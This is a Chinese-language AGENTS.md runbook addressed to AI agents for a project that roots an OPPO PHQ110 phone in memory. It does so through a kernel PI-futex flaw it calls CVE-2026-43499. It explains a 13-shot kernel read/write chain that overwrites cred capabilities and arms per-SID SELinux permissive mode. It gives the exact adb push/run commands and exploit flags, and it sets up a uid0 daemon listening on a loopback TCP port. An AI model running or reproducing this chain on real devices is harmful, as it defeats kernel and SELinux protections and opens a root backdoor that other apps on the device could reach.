# AGENTS.md（项目级）— phq110-root 交付集

> 先读工作区入口：`D:\Work\Workspace\AGENTS.md`。本文件只写**本目录**特有规则与完整上下文。
>
> **目标读者：没有任何上下文的 AI agent。** 本目录自包含：二进制、源码、Termux 客户端、
> 构建脚本、全部关键地址的来源与失败面。读完本文件即可知道「这是什么、在哪、怎么跑、
> 什么已验证、什么没有」。
>
> 本目录是**纯离线**产出的文档集 + 产物副本：编写时未连接设备、未 `adb`/`push`、未执行
> exploit、未改动设备上任何文件。文中所有「真机实测」均转述自已有执行记录并标为 observed；
> 未做过的一律标为 inferred / 未验证。
>
> 项目状态：`snapshot`（一次性成果交付，冻结保留；如需继续开发按 `experiment` 处理）。
> 运行侧依赖只有 `adb` + 设备上的 Termux(`python3`)；重编需要 Linux/WSL +
> `aarch64-linux-gnu-gcc`（见 `BUILD.md`）。
>
> 设备指纹 / 链路可用的基线：`BASELINE.md`（系统更新前先对比它，别直接跑链）。
> 人类入口：`README.md`（面向人类的总览，**不要**拿它当 agent 规范）；
> 风险与红线：`RISKS.md`；验收记录：`DEFECTS.md` / `ACCEPTANCE.md`。

---

## 0. 一句话

在 **OPPO PHQ110（Android 14，内核 5.4.254-qgki，C.53）** 上，从 `adb shell` 的
`uid=2000 / u:r:shell:s0` 出发，用 **CVE-2026-43499（GhostLock，POSIX PI futex 悬挂
`rt_mutex_waiter` + `rb_erase` 受控 8 字节写）** 在内核里完成：

1. 6 发读链拿到本进程的 `task_struct` / `cred` / `selinux_state`；
2. 2 发写把 **per-SID permissive**（只对 shell 的 SELinux type 放行）武装进
   `policydb->permissive_map`；
3. 5 发写把 `cred` 的 5 个 capability 字段改成受控值 `V`；
4. 在 `enforcing` **仍然为 1** 的窗口里用普通 `setresgid/setresuid(0,0,0)` 取得 uid0，
   SELinux 域仍保持 `u:r:shell:s0`；
5. fork 一个 uid0 的 `rootd` 监听 `127.0.0.1:10369`（≥32B secret 鉴权），供 Termux 取 uid0 shell；
6. 可选：fork+exec Shizuku 的 starter，让 `shizuku_server` 以 uid0 运行并向 app 分发 binder。

**这是内存态 root，不是持久 root。** 冷启动即全部恢复；全程不写任何分区、不碰用户数据。

---

## 1. 状态（三档标注约定）

本文档所有结论都带下面三档之一，**不要把未验证的当成已完成**：

| 标注 | 含义 |
|---|---|
| **observed** | 真机实测并留有日志/命令输出（本仓库只引用可复述的判据行） |
| **inferred** | 由源码、反汇编、QEMU 或机理推断，未在真机上直接看到 |
| **未验证 / 未实施** | 没做过，或只存在于设计里 |

当前状态摘要：

| 项 | 状态 |
|---|---|
| 13 发链路单 boot 跑通（Phase A：uid0 + cap + 域不变） | **observed**（两次独立冷启动均成功；第二次因一发静默 no-op 重发而计为 **14 发**，设计账本仍是 13，见 `ARCHITECTURE.md` §4 注） |
| 交付腿：uid0 rootd + 10369 + secret 握手 + REPL | **observed** |
| Termux 内取 uid0（`termux_uid0.py ... id`） | **observed** |
| Shizuku 服务端 uid0 + binder 投递 + Manager 配置落盘 | **observed** |
| Shizuku **app 侧** `rish` 实际提权 | **未验证（人类待验）** |
| keeper / 自动 re-spawn（rootd 被杀后本 boot 恢复 uid0） | **未实施**（可行性有离线裁定，二进制内无此代码） |
| per-SID 武装成功率统计 | **未统计**（已知有静默失败与 panic 各一次） |
| unix socket 替代 TCP（配合 0600 的改进） | **未实施** |
| 多用户 / 工作资料适配 | **未验证** |

---

## 2. 边界（必须遵守）

- 禁止：fastboot 的 flash / -w、EDL/9008 写、任何分区写/擦、`mount -o remount,rw`、
  改 `/system` `/vendor` `/product`、清空/格式化用户数据、恢复出厂。
- 禁止：用官方解锁/官方 root/刷机流程获取 root。
- 禁止：kill rootd / shizuku_server；armed 之后向 `/dev/pmsg0` 写入（会野读 panic）。
- 禁止：同一个 boot 跑第二次 glx（会 panic；要重来必须人类正常冷启动）。
- 未经人类/主 agent 明确授权，不做执行类（写入/提权执行）操作；新环境/新设备要重新确认授权。

---

## 3. 常用命令（本机 = 宿主；设备侧见 `USAGE.md`）

```bash
# 产物完整性（任意平台，Python）
python -c "import hashlib;print(hashlib.sha256(open(r'build/glx_p11n','rb').read()).hexdigest())"
# 期望 90b9e66b0122fc94bb4decba731359fa4b6e7e828654cfdb603fd448106549e4 / 1007336 字节

# 重编（Linux/WSL，需 aarch64-linux-gnu-gcc；未在 Windows 原生验证）
sh ./build.sh
```

---

## 4. 目录结构

```
phq110-root/
├── README.md          面向人类的总览（是什么/为什么/现在能做什么/怎么开始）
├── AGENTS.md          本文件：agent 入口（项目规则 + 完整上下文 + 红线）
├── ARCHITECTURE.md    13 发链路逐发说明：目的/写入目标/地址与偏移来源/成功判据/失败面
├── USAGE.md           Termux 客户端用法、协议、保活、Shizuku 授权、故障排查
├── BUILD.md           如何从本目录源码重编 glx（工具链、静态 ET_EXEC、双编译一致、UT/自检）
├── ARTIFACTS.md       二进制/源码/客户端的大小 + sha256 + 构建来源 + 设备部署路径
├── RISKS.md           遗留风险、未验证项、操作红线、失败面汇总
├── CHANGELOG.md       p3→p11n 版本演进与每次真机失败的确切原因
├── DEFECTS.md         独立验收的缺陷清单与处置（发现项/是否已修/证据）
├── ACCEPTANCE.md      一页式验收结论
├── build/
│   └── glx_p11n       真机验证过的最终二进制（1007336 B）
├── src/
│   ├── glx_p11n.c     主程序（读链/武装/写原语/交付腿/stage3）
│   ├── rootd_zd.c     uid0 daemon（协议 G/I/R/X/F/P/Q；无 W）
│   ├── shz_launch.c   Shizuku starter / app_process 启动器
│   ├── shz_launch.h   stage3 常量与退出码契约
│   ├── dtable.h       QEMU 符号表 / 偏移表（仅 qemu 后端用）
│   ├── qtable.h       QEMU 候选地址表（仅 qemu 后端用）
│   └── shz_env_snapshot.h  Shizuku 启动所需 init 环境快照
├── tools/
│   ├── termux_uid0.py Termux 侧客户端（tcp/file/unix；selftest/id/read/sh/exec/repl/wait）
│   └── termux_accept.sh  更重的 Termux 验收脚本（p11m 时代写成，p11n 下非必需，见 USAGE）
└── build.sh           自包含重建脚本（只读本目录；面向 Linux/WSL）
```

> 本目录**不包含** `zd_secret` 的值。secret 必须在设备上生成/读取，只允许出现在
> `/data/data/com.termux/files/home/zd_secret`（0600、属主 Termux uid，通常是 10369）。

---

## 5. 快速上手（最短路径）

前提：设备已 root 之外的一切正常（未解锁 bootloader、Enforcing、无 su），adb 可用。
**每个 boot 只允许跑一次 glx**；失败或不满意 → 人类正常重启手机（不是 fastboot/EDL）。

占位符：`<NN>` = 本次轮次标签（任意整数，只用于文件名/日志，不参与逻辑）；
`<rootd pid>` = `ps` 里 rootd 的 pid。命令里的 `<...>` 都要换成现场值。
多设备时给每条 `adb` 命令加 `-s <SERIAL>`（`<SERIAL>` = `adb devices` 第一列；单设备可省略）。

### 5.1 电脑侧（Windows / PowerShell 或任意 shell）

```bash
# 1) 只读前置（任一不满足即停，不要 push）
adb devices                                  # 目标设备必须是 "device"
adb shell cat /proc/sys/kernel/random/boot_id # 记下；必须与「已消耗 boot 列表」不同
adb shell getenforce                         # 必须 Enforcing
adb shell cat /proc/self/attr/current         # 必须 u:r:shell:s0
adb shell 'head -1 /proc/kallsyms 2>&1; echo rc=$?'   # 必须被拒；可读=本 boot 已武装→停
adb shell 'ls /sys/fs/pstore 2>&1; echo rc=$?'       # 必须被拒；可列=本 boot 已武装→停

# 2) push + 设备端复核（用新文件名，不覆盖设备已有文件）
adb push build/glx_p11n /data/local/tmp/glx_p11n.r<NN>
adb shell sync
adb shell chmod 755 /data/local/tmp/glx_p11n.r<NN>
adb shell sha256sum /data/local/tmp/glx_p11n.r<NN>
adb shell stat -c '%s %a' /data/local/tmp/glx_p11n.r<NN>
# 必须：90b9e66b0122fc94bb4decba731359fa4b6e7e828654cfdb603fd448106549e4 / 1007336

# 3) 唯一一次执行（必须真 pty；否则 panic 前的日志会被全缓冲吞掉）
adb shell -t -t 'cd /data/local/tmp && ./glx_p11n.r<NN> --mode device --round <NN> \
  --stop-after=shzlaunch --shz-after-deliver --deliver-fork \
  --zd=tcp --zd-port=10369 --zd-client-selftest; echo GLX_SHELL_EXIT=$?'
```

期望最后几行（**不要只看程序自己的 `RESULT=PASS`**，按 `ARCHITECTURE.md` §4/§7/§8/§9 的判据逐条核）：

```text
GLX|ROOTD_LISTEN|PASS|pid=...|port=10369|uid=0|euid=0|ppid_after_exit=1|chan=tcp
GLX|DELIVER|chan=tcp|child_pid=...|ppid_after_exit=1|port=10369|...|exec=NO|...
GLX|ZD_SECRET|POST_LISTEN|path=...|mode=0600|uid=10369|size=64|termux_readable=1
GLX|ZDCONNECT|PASS|port=10369|uid=10369
GLX|ZD_UID|PASS|st=0|uid=0 euid=0 gid=0 pid=... ctx=u:r:shell:s0
GLX|ZD_REPL|SUMMARY|n=3|ok=3|want=3
GLX|STAGE3_INIT|mode=starter|uid=0|euid=0|apk=...
GLX|STAGE3_EXEC|pid=...
GLX|STAGE3_MAIN|PASS|pid=...|ctx=u:r:shell:s0
GLX|STAGE3_BINDER|PASS|json=/data/user_de/0/com.android.shell/shizuku.json|size=...
GLX|SHZ_AFTER_DELIVER|PASS rc=0
GLX|STOP_AFTER=shzlaunch|PASS round=<NN> shots=13 uid=0 euid=0 delivery=verified stage3=ran
GLX|ZD_PERSIST|pid=...|KEEP=1|reason=run_complete|revoke=kill -9 ...
GLX_SHELL_EXIT=0
```

> `shots` 的设计值是 13；若某发静默 no-op 被重发，会是 14（见过）。见 `USAGE.md` §1.5。
> `GLX_SHELL_EXIT=0` 由外层 shell 打印；`--deliver-fork` 下 rootd 会继续持有这个 pty，
> 所以 `adb shell -t -t` 可能在打印完这些行后**不返回**——这时主跑其实已经完成，
> 另开一条 adb shell 做 §1.6 的独立取证即可（详见 `USAGE.md` §1.7）。

参数三条硬规则：

- `--stop-after=shzlaunch`：要**启动** Shizuku 用 `shzlaunch`；`shzcheck` 只验证已存在的
  server、不 fork（本链没有预存 server，所以用 `shzlaunch`）。
- **不要加 `--no-ambient`**：那是「只 fork 不 exec」的降级档；stage3 需要 exec 后仍保留
  caps（ambient 档）。
- 不要同时让 Termux 的 `termux_accept.sh` 抢占连接（rootd 是单线程 accept）；二者选一。

### 5.2 手机侧 Termux（取 uid0）

```bash
# 一次性准备（secret 通常由 glx 自动创建；手工预建也可以）
mkdir -p ~/zd_chan && chmod 700 ~/zd_chan
[ -f ~/zd_secret ] || python3 -c "import os;open(os.path.expanduser('~/zd_secret'),'w').write(os.urandom(32).hex())"
chmod 600 ~/zd_secret
cp /data/local/tmp/termux_uid0.py ~/termux_uid0.py   # 宿主上先 adb push tools/termux_uid0.py /data/local/tmp/
chmod 755 ~/termux_uid0.py
# 若上面 cp 报 Permission denied（不同 ROM 的 SELinux 差异），改用共享存储：
#   宿主: adb push tools/termux_uid0.py /sdcard/Download/termux_uid0.py
#   Termux: termux-setup-storage && cp ~/storage/downloads/termux_uid0.py ~/ && chmod 755 ~/termux_uid0.py

# 取 uid0（本次成功命例的原文命令）
python3 ~/termux_uid0.py --chan=tcp --port=10369 --secret-file="$HOME/zd_secret" id
# 期望输出形状：
#   uid=0 euid=0 gid=0 pid=<rootd pid> ctx=u:r:shell:s0

# 全量自检
python3 ~/termux_uid0.py --chan=tcp --port=10369 --secret-file="$HOME/zd_secret" selftest
# 期望：SUMMARY|PASS|fails=0
```

详细用法（`--chan=tcp|file`、R/X/F/P 四类操作、**没有 W 写操作**、保活、Shizuku/rish 验收、
故障排查）见 `USAGE.md`。

---

## 6. 安全提醒（**最高优先级**，详见 `RISKS.md` §1）

`rootd` 的 TCP 通道绑定 `127.0.0.1:10369`。**Android 上 loopback 不是信任边界**：
任何持有网络权限的应用都能连到它。当前唯一保护是
`/data/data/com.termux/files/home/zd_secret`（0600、属主 Termux、64 个十六进制字符 = 32 字节随机值）。

- **secret 一旦泄露、被复制、被改成弱口令，等于把 uid0 交给全机应用。**
- 正确做法：只在 Termux 私有目录保存；不要 `cat`/截图/写进日志；不要放到 `/sdcard`、
  `/data/local/tmp`（`/data/local/tmp` 下 0600 也不属于 Termux，glx 会 fail-closed 拒绝）。
- 改进方向（**未实施**）：改用 `AF_UNIX` 文件系统 socket + 目录/文件 0600（并校验对端 uid），
  或再加一层 bind 前的随机名/UDS 路径 + `SO_PEERCRED`。当前交付**没有**这个改进。

---

## 7. 术语与关键概念

| 术语 | 含义 |
|---|---|
| GhostLock | CVE-2026-43499：5.4.254 的 PI-futex 死锁环让受害者线程的内核栈上留下悬挂 `rt_mutex_waiter`；随后 `sched_setattr` 触发 `rb_erase` 产生受控 8 字节写 |
| D | 内核 KASLR slide；`实际地址 = 链接期常量 + D`；每个 boot 现场求解，不是写死值 |
| pmsg 页 | `/dev/pmsg0`（ramoops/persistent_ram）的内核 vmap 页；我们把 fake `rt_mutex`、fake `ebitmap_node`、cap 值 `V` 都放在这一页里 |
| per-SID permissive | 只让 SELinux 的 shell type（1464）在 capability/file 类判定上按 permissive 处理，`enforcing` 全局仍为 1 |
| 交付腿（Phase B） | glx 在 uid0 后 fork 出 `rootd`，监听 `127.0.0.1:10369`，给 Termux 提供 uid0 执行面 |
| stage3 | uid0 进程 fork+exec Shizuku starter，让 `shizuku_server` 以 uid0 运行 |
| 发（shot） | 一次 GhostLock 8 字节写（读操作也是「写一个指针到 tcp_mem 表项、再读回」的一发） |
| T（受害者线程） | 三线程 PI-futex 死锁环里留下悬挂 `rt_mutex_waiter` 的那个线程；它的内核栈槽（`stack_base+0x3bb8`）是填充目标 |
| V / X / W | V = 写进 cred 的 cap 值（`pmsg base+0x830C6`）；X = fake `ebitmap_node` 地址（`base+0x100`）；W = `permissive_map.highbit` 的写值（`base+0x3000`）；详见 `ARCHITECTURE.md` §3.4/§4 |

---

## 8. 哪些东西不能动

- `build/glx_p11n`：这是**唯一真机验证过**的二进制（sha256 见 `ARTIFACTS.md`）；改 sha 就作废。
- `src/*.c` / `src/*.h`：读链/武装/cap 写/stage3 常量一旦改动必须重新上机验证。
- `tools/termux_uid0.py`：Termux 侧唯一交付客户端。
- 任何文件都不要清掉；本项目是一次性快照（`snapshot`）。

---

## 9. 密钥

- 不使用 Infisical 管理的密钥。
- 设备 secret 只在 `/data/data/com.termux/files/home/zd_secret`（0600、属主 Termux，通常 uid 10369）；
  文档只写路径/权限/长度，**任何情况下不要把值写进 Markdown/脚本/日志/聊天**。
- loopback 不是信任边界：secret 泄露 = 把 uid0 交给全机应用（见 `RISKS.md` §1）。

---

## 10. 外部服务/部署影响

- 无服务器、无外部部署、无持久化。唯一外部影响是：在本机 `adb` 连着的手机上执行内存态 exploit
  （设备可能 panic 自动重启，约 5 秒；数据不受影响）。

---

## 11. 与工作区规范（`D:\Work\Workspace\AGENTS.md`）的关系

已逐条对照工作区 `AGENTS.md` 及它指向的 `docs\PROJECT_DOCUMENTATION_STANDARD.md`：

| 工作区约定 | 本交付的做法 | 结论 |
|---|---|---|
| 默认中文沟通 | 全部文档中文 | 符合 |
| 不把明文密码/API key/token/私钥/恢复码写入 Markdown | 只写 secret 的**路径/权限/长度/属主**，不写值；本目录没有任何真实凭据 | 符合 |
| 保护现有改动；不重置、删除、覆盖宽目录 | 只新增本交付目录，未改动工作区其它目录；本目录此前为空 | 符合 |
| 项目放在 `Projects/` 下 | `Projects/RE/phq110-root` | 符合 |
| 根 `AGENTS.md` 保持短入口、长历史放 `docs/archive` | 本交付是**自包含快照**（目标读者是无上下文的 agent），因此用多文件长文档、不依赖工作区 `docs/`；这是有意取舍 | 有意偏差 |
| 项目特有规则放项目自己的 `AGENTS.md` | 本文件即是（项目目标/边界/常用命令/红线，转发到其余文档） | 符合 |
| README 应含：一句话、状态标签、主要入口、快速开始、依赖环境、密钥说明、常见坑 | 人类入口 `README.md`；agent 上下文见本文件 §0/§1/§4/§5；依赖见 `BUILD.md`；密钥见 §6/§9；常见坑见 `USAGE.md` §5 | 符合 |
| 标准建议 `docs/` 子目录放架构/运维/变更 | 本交付按移交要求用平铺 md（便于整目录复制给下一个 agent），架构/用法/构建/产物/风险/变更各一份 | 有意偏差 |
| 密钥走 Infisical 并登记 `SECRET_MAP.md` | 本项目不使用 Infisical 管理的密钥；设备 secret 只在设备 Termux home 生成/保存，不进仓库、不需要登记 | 不适用 |

---

## 12. 阅读顺序建议

1. 本文件（是什么/在哪/怎么跑/红线）。
2. `ARCHITECTURE.md` §4 的 13 发表（搞清每一发在干什么、判据是什么、失败长什么样）。
3. `USAGE.md`（真正上机时照着粘贴）。
4. `RISKS.md`（上线前必须知道的红线与未验证项）。
5. 要改代码/重编 → `BUILD.md`；要核对产物 → `ARTIFACTS.md`；要理解为什么某版失败 → `CHANGELOG.md`。
6. 要知道「这份文档本身被查过什么、改过什么、还剩什么要人类盖章」→ `DEFECTS.md` 与 `ACCEPTANCE.md`。
